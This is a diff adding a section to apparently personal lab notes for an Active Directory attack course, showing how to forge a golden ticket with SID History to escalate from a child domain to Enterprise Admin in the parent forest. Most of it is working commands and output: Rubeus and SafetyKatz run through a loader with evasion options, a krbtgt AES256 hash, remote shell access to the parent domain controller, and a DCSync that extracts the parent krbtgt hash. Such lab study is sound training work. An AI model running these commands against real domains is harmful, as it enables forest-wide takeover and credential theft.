@@ -1220,6 +1220,62 @@ C:\AD\Tools> winrs -r:dcorp-dc cmd
 
 ---
 
+### Golden Ticket → Enterprise Admin Escalation
+
+**Using Child Domain krbtgt to Access Parent Domain**
+
+LO19 technique: Forge golden ticket with SID History for parent domain Enterprise Admins
+
+#### Prerequisites
+- krbtgt AES256 hash from child domain (via DCSync)
+- Child domain SID
+- Parent domain Enterprise Admins SID (ending in -519)
+
+#### Create Golden Ticket with Parent Domain SID History
+```powershell
+# Forge golden ticket with SID History for Enterprise Admins in parent domain
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args evasive-golden 
+    /user:Administrator 
+    /id:500 
+    /domain:dollarcorp.moneycorp.local 
+    /sid:S-1-5-21-719815819-3726368948-3917688648 
+    /sids:S-1-5-21-335606122-960912869-3279953914-519 
+    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
+    /netbios:dcorp 
+    /ppt
+
+# /sids: Enterprise Admins SID from parent domain (moneycorp)
+# /netbios: Child domain netbios name
+# Result: Ticket injected with parent domain enterprise admin privileges
+```
+
+#### Access Parent Domain Resources
+```powershell
+# Now can access parent domain DC as Enterprise Admin
+C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
+Microsoft Windows [Version 10.0.20348.2227]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.dcorp> set username
+USERNAME=Administrator
+
+C:\Users\Administrator.dcorp> set computername
+COMPUTERNAME=MCORP-DC
+```
+
+#### DCSync Parent Domain from Child with Golden Ticket
+```powershell
+# Use golden ticket to perform DCSync on parent domain
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+
+# Result: Parent domain krbtgt hash extracted
+# This gives persistent Enterprise Admin access to entire forest
+```
+
+---
+
 ### Silver Ticket for WinRM (HTTP Service)
 ```powershell
 # Obtain machine account hash
